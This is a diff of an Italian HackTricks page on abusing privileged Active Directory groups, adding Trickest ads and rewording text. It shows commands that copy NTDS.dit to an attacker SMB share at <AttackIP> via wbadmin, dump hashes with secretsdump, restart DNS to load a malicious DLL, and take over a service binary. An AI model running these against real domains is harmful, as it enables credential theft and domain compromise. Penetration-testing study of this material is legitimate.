@@ -15,7 +15,14 @@ Impara e pratica GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-s
 </details>
 {% endhint %}
 
-## Gruppi Noti con privilegi di amministrazione
+<figure><img src="/.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
+
+Usa [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=command-injection) per costruire e **automatizzare flussi di lavoro** alimentati dagli **strumenti comunitari più avanzati** al mondo.\
+Ottieni Accesso Oggi:
+
+{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=command-injection" %}
+
+## Gruppi Ben Noti con privilegi di amministrazione
 
 * **Amministratori**
 * **Amministratori di Dominio**
@@ -59,7 +66,7 @@ L'accesso ai file sul DC è limitato a meno che l'utente non faccia parte del gr
 
 ### Escalation dei Privilegi
 
-Utilizzando `PsService` o `sc` di Sysinternals, è possibile ispezionare e modificare i permessi dei servizi. Il gruppo `Server Operators`, ad esempio, ha il pieno controllo su determinati servizi, consentendo l'esecuzione di comandi arbitrari e l'escalation dei privilegi:
+Utilizzando `PsService` o `sc` da Sysinternals, è possibile ispezionare e modificare i permessi dei servizi. Il gruppo `Server Operators`, ad esempio, ha il pieno controllo su determinati servizi, consentendo l'esecuzione di comandi arbitrari e l'escalation dei privilegi:
 ```cmd
 C:\> .\PsService.exe security AppReadiness
 ```
@@ -67,7 +74,7 @@ Questo comando rivela che i `Server Operators` hanno accesso completo, consenten
 
 ## Backup Operators
 
-L'appartenenza al gruppo `Backup Operators` fornisce accesso al file system di `DC01` grazie ai privilegi `SeBackup` e `SeRestore`. Questi privilegi abilitano la traversata delle cartelle, l'elenco e la copia dei file, anche senza permessi espliciti, utilizzando il flag `FILE_FLAG_BACKUP_SEMANTICS`. È necessario utilizzare script specifici per questo processo.
+L'appartenenza al gruppo `Backup Operators` fornisce accesso al file system di `DC01` grazie ai privilegi `SeBackup` e `SeRestore`. Questi privilegi abilitano la traversata delle cartelle, l'elenco e le capacità di copia dei file, anche senza permessi espliciti, utilizzando il flag `FILE_FLAG_BACKUP_SEMANTICS`. È necessario utilizzare script specifici per questo processo.
 
 Per elencare i membri del gruppo, eseguire:
 ```powershell
@@ -130,8 +137,8 @@ secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
 ```
 #### Utilizzando wbadmin.exe
 
-1. Configura il filesystem NTFS per il server SMB sulla macchina dell'attaccante e memorizza nella cache le credenziali SMB sulla macchina target.
-2. Usa `wbadmin.exe` per il backup del sistema e l'estrazione di `NTDS.dit`:
+1. Configurare il filesystem NTFS per il server SMB sulla macchina dell'attaccante e memorizzare nella cache le credenziali SMB sulla macchina target.
+2. Utilizzare `wbadmin.exe` per il backup del sistema e l'estrazione di `NTDS.dit`:
 ```cmd
 net use X: \\<AttackIP>\sharename /user:smbuser password
 echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
@@ -139,13 +146,13 @@ wbadmin get versions
 echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
 ```
 
-Per una dimostrazione pratica, vedere [VIDEO DEMO CON IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).
+Per una dimostrazione pratica, vedere [VIDEO DIMOSTRATIVO CON IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).
 
 ## DnsAdmins
 
-I membri del gruppo **DnsAdmins** possono sfruttare i loro privilegi per caricare una DLL arbitraria con privilegi di SYSTEM su un server DNS, spesso ospitato su Domain Controllers. Questa capacità consente un potenziale di sfruttamento significativo.
+I membri del gruppo **DnsAdmins** possono sfruttare i loro privilegi per caricare una DLL arbitraria con privilegi di SYSTEM su un server DNS, spesso ospitato su Domain Controllers. Questa capacità consente un significativo potenziale di sfruttamento.
 
-Per elencare i membri del gruppo DnsAdmins, usa:
+Per elencare i membri del gruppo DnsAdmins, utilizzare:
 ```powershell
 Get-NetGroupMember -Identity "DnsAdmins" -Recurse
 ```
@@ -176,7 +183,7 @@ Riavviare il servizio DNS (che potrebbe richiedere permessi aggiuntivi) è neces
 sc.exe \\dc01 stop dns
 sc.exe \\dc01 start dns
 ```
-Per ulteriori dettagli su questo vettore d'attacco, fare riferimento a ired.team.
+Per ulteriori dettagli su questo vettore di attacco, fare riferimento a ired.team.
 
 #### Mimilib.dll
 È anche possibile utilizzare mimilib.dll per l'esecuzione di comandi, modificandolo per eseguire comandi specifici o reverse shell. [Controlla questo post](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) per ulteriori informazioni.
@@ -198,16 +205,16 @@ Questo gruppo può modificare i DACL sugli oggetti di dominio, potenzialmente co
 Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
 ```
 ## Hyper-V Administrators
-Gli Amministratori di Hyper-V hanno accesso completo a Hyper-V, che può essere sfruttato per ottenere il controllo sui Domain Controller virtualizzati. Questo include la clonazione di DC attivi ed estraendo gli hash NTLM dal file NTDS.dit.
+Gli amministratori di Hyper-V hanno accesso completo a Hyper-V, che può essere sfruttato per ottenere il controllo sui Domain Controller virtualizzati. Questo include la clonazione di DC live ed estraendo gli hash NTLM dal file NTDS.dit.
 
-### Esempio di Sfruttamento
-Il servizio di manutenzione di Mozilla Firefox può essere sfruttato dagli Amministratori di Hyper-V per eseguire comandi come SYSTEM. Questo comporta la creazione di un collegamento fisico a un file di sistema protetto e la sua sostituzione con un eseguibile malevolo:
+### Esempio di sfruttamento
+Il servizio di manutenzione di Mozilla Firefox può essere sfruttato dagli amministratori di Hyper-V per eseguire comandi come SYSTEM. Questo comporta la creazione di un hard link a un file SYSTEM protetto e la sua sostituzione con un eseguibile malevolo:
 ```bash
 # Take ownership and start the service
 takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
 sc.exe start MozillaMaintenance
 ```
-Nota: Lo sfruttamento dei collegamenti hard è stato mitigato negli aggiornamenti recenti di Windows.
+Nota: Sfruttare i collegamenti hard è stato mitigato negli aggiornamenti recenti di Windows.
 
 ## Gestione dell'Organizzazione
 
@@ -241,7 +248,7 @@ Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Us
 Per le tecniche di sfruttamento relative a **WinRM**, è necessario consultare documentazione specifica.
 
 #### Server Operators
-Questo gruppo ha i permessi per eseguire varie configurazioni sui Domain Controller, inclusi privilegi di backup e ripristino, modifica dell'ora di sistema e spegnimento del sistema. Per enumerare i membri, il comando fornito è:
+Questo gruppo ha i permessi per eseguire varie configurazioni sui Domain Controller, inclusi i privilegi di backup e ripristino, la modifica dell'ora di sistema e lo spegnimento del sistema. Per enumerare i membri, il comando fornito è:
 ```powershell
 Get-NetGroupMember -Identity "Server Operators" -Recurse
 ```
@@ -261,6 +268,13 @@ Get-NetGroupMember -Identity "Server Operators" -Recurse
 * [https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
 * [https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
 * [https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)
+
+<figure><img src="/.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
+
+Usa [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=command-injection) per costruire e **automatizzare flussi di lavoro** facilmente, alimentati dagli **strumenti** della comunità **più avanzati** al mondo.\
+Accedi oggi:
+
+{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=command-injection" %}
 
 {% hint style="success" %}
 Impara e pratica il hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
